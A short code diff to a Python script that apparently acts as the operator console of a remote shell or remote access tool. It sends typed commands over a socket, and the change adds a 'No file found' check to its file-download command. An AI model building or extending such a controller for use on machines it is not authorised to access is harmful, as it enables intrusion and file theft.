@@ -32,10 +32,14 @@ while True:
 		recv = recv_data()
 		print(recv.decode("utf-8"))
 		continue
-	
+
 	elif cmd[:8] == "download":
 		connection.send(bytes(cmd, "utf-8"))
+
 		file_output = recv_data()
+		if file_output == b"No file found":
+			print(file_output.decode("utf-8"))
+			continue
 
 		with open(f'{cmd[9:]}', 'wb') as write_data:
 			write_data.write(file_output)
